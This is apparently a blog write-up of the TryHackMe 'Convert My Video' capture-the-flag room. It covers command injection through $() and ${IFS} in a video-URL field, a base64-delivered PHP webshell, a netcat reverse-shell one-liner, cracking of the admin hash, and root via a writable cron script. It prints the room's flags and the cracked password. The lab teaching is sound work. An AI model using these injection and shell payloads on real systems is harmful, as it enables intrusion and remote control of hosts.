---
layout: post
title: "Convert My Video | THM Writeup"
date: 2026-11-22
categories:
  - writeups
  - thm
platform: thm
level: medium
points: 170
author: "othmane01"
tags:
  - tryhackme
  - thm
  - convert-my-video
  - command-injection
  - os-command-injection
  - remote-code-execution
  - rce
  - bash
  - command-substitution
  - linux
  - linux-enumeration
  - privilege-escalation
  - linux-privilege-escalation
  - cron
  - cronjob
  - cron-abuse
  - pspy
  - php
  - webshell
  - reverse-shell
  - hash-cracking
  - john-the-ripper
  - suid
  - web-exploitation
  - web-security
  - penetration-testing
  - ethical-hacking
  - cybersecurity
  - infosec
  - ctf
  - capture-the-flag
  - red-team
  - offensive-security
---

![Image]({{ site.baseurl }}/images/convert-my-video/1.png)

**Convert My Video** is a medium-difficulty TryHackMe challenge. In this step-by-step walkthrough, we'll exploit a command injection vulnerability to gain an initial foothold, then abuse a misconfigured root cron job to obtain root privileges.

**Room Link:** [Convert My Video](https://tryhackme.com/room/convertmyvideo)

## RECON

As always, I start by enumerating the target with Nmap to identify open ports and the versions of the services running on them.

**Nmap output:**

```bash
nmap -p- -T4 --min-rate 2000 10.129.186.39 -oN nmap.scan
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

## PORT 80

![webapp]({{ site.baseurl }}/images/convert-my-video/2.png)

Let's try entering some random text (`othmane01 says hi`) and intercept the request to see how the web application handles our input.

Interesting! The application leaks quite a lot of useful information.

![webapp]({{ site.baseurl }}/images/convert-my-video/3.png)

While playing around with the application, I also run Gobuster in the background to discover additional directories.

```bash
gobuster dir -u http://10.129.186.39 \
-w /opt/seclists/Discovery/Web-Content/quickhits.txt --no-error
```

Interesting results:

```text
admin/  (Status: 401) [Size: 460]
tmp     (Status: 301) [Size: 312] [--> http://10.129.186.39/tmp/]
```

**/tmp**

From the earlier information leak, we already know that `/tmp` is used as the conversion output directory.

![tmp]({{ site.baseurl }}/images/convert-my-video/4.png)

**/admin**

Looks like we need credentials to access this page.

![admin]({{ site.baseurl }}/images/convert-my-video/5.png)

Let's go back to the conversion functionality.

### Command Injection

I start a Python HTTP server on my attacking machine. The idea is to make the target send requests to my machine instead of YouTube.

```bash
python3 -m http.server 1337
```

![the_request]({{ site.baseurl }}/images/convert-my-video/6.png)

![image]({{ site.baseurl }}/images/convert-my-video/7.png)

Time to investigate the possibility of command injection.

Well, well, well. This one was surprisingly easy!

![id]({{ site.baseurl }}/images/convert-my-video/8.png)

If we want the output of our injected command to reach our Python server, we can use an HTTP request as a callback.

![request]({{ site.baseurl }}/images/convert-my-video/9.png)

![id]({{ site.baseurl }}/images/convert-my-video/10.png)

### Why does the injection work?

The interesting part of this vulnerability is the use of `$()`.

`$()` is a Bash feature called **command substitution**. It allows us to execute a command inside another command and replace the expression with that command's output.

For example:

```bash
echo $(whoami)
```

Output:

```text
www-data
```

The application inserts our input directly into a shell command.

Instead of providing a normal video ID, we can provide:

```bash
$(whoami)
```

The resulting command becomes something like:

```bash
youtube-dl https://whatever-you-type/watch?v=$(whoami)
```

The shell executes `whoami` before executing the outer command.

In our case, this allows us to execute arbitrary commands through the vulnerable parameter.

### Getting a Shell

Moving on, let's get a shell on the box.

At this point, the target IP changes from **10.129.186.39** to **10.129.181.136**.

Before trying to get a reverse shell, let's check where we are using the `pwd` command:

```text
youtube-dl https://whatever-you-type/watch?v=$(pwd)
```

Output:

```text
/var/www/html
```

![path]({{ site.baseurl }}/images/convert-my-video/11.png)

Now, let's try creating a file called `test.txt` containing the word `test` to check whether we have write permissions in the current directory.

```bash
yt_url=http://blabla/watch?v=$(echo${IFS}test>test.txt)
```

Looks like we cannot write to the current directory.

![ls]({{ site.baseurl }}/images/convert-my-video/12.png)

Let's try the same thing in the `/tmp` directory.

The full path is:

```text
/var/www/html/tmp
```

![image]({{ site.baseurl }}/images/convert-my-video/13.png)

There we go!

![image]({{ site.baseurl }}/images/convert-my-video/14.png)

A quick explanation: `${IFS}` represents the shell's Internal Field Separator. By default, it contains whitespace characters.

The application filters literal spaces from our input, but `${IFS}` allows us to introduce whitespace when the shell processes the command.

This is why the following command works without containing an actual space:

```bash
echo${IFS}test
```

### Uploading a PHP Webshell

The plan from here is straightforward:

1. Create a simple PHP webshell.
2. Write it into the `/tmp` directory.
3. Use it to execute commands through the browser.
4. Obtain a reverse shell.

Our simple PHP webshell:

```php
<?php system($_GET['c']); ?>
```

To avoid issues with special characters and spaces in the injection payload, I'll encode the PHP code using Base64.

**Payload:**

```text
yt_url=http://blabla/watch?v=$(echo${IFS}BASE64_ENCODED_SHELL|base64${IFS}-d>/var/www/html/tmp/shell.php)
```

![request]({{ site.baseurl }}/images/convert-my-video/15.png)

There we go!

![image]({{ site.baseurl }}/images/convert-my-video/16.png)

## FLAG 1

We can now execute commands through our webshell and retrieve the first flag.

```text
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

![image]({{ site.baseurl }}/images/convert-my-video/17.png)

### Getting a Reverse Shell

Enough jumping around. Let's get a proper reverse shell.

I'll use the following Bash reverse shell:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc IP PORT >/tmp/f
```

Replace `IP` and `PORT` with your attacking machine's VPN IP and listening port.

Make sure to URL-encode the payload before sending it through the webshell.

![image]({{ site.baseurl }}/images/convert-my-video/18.png)

### Improving the TTY

To get a more interactive shell and use commands such as `clear`, we can upgrade our TTY.

First, spawn a PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

1. Press `Ctrl + Z` to suspend the current shell.
2. Run the following commands in your local terminal:

```bash
stty raw -echo; fg
export TERM=xterm
```

We now have a much more comfortable interactive shell.

## Cracking the Admin Credentials

During enumeration, I also discovered the admin username and a password hash.

![admin]({{ site.baseurl }}/images/convert-my-video/19.png)

**Cracking the hash:**

I save the hash into a file called `hash.txt`:

```bash
echo 'itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/' > hash.txt
```

Then use John the Ripper with the RockYou wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![hash]({{ site.baseurl }}/images/convert-my-video/20.png)

The password is recovered!

![admin]({{ site.baseurl }}/images/convert-my-video/21.png)

We now have the following credentials:

```text
Username: itsmeadmin
Password: jessie
```

## ROOT

After some manual enumeration, I decide to upload `pspy` to the target to monitor processes and identify commands running in the background.

Start a Python HTTP server on your attacking machine and transfer the binary to the target.

Interesting! I notice a cron job running as root that executes a shell script we can write to.

![admin]({{ site.baseurl }}/images/convert-my-video/22.png)

**N.B.:**

I initially tried to enumerate the cron jobs manually, but I couldn't see the jobs running as root with my current privileges.

That's why tools like `pspy` are useful. It allows us to monitor processes without requiring root privileges and can reveal commands executed by scheduled tasks.

![admin]({{ site.baseurl }}/images/convert-my-video/23.png)

We have several possible ways to exploit this misconfiguration and escalate our privileges.

To keep things simple, I'll use the root cron job to read the root flag.

![root]({{ site.baseurl }}/images/convert-my-video/24.png)

```text
flag{d9b368018e912b541a4eb68399c5e94a}
```

That's it, guys! I hope you learned something along the way. Thanks for reading!

![Image]({{ site.baseurl }}/images/cat.jpeg)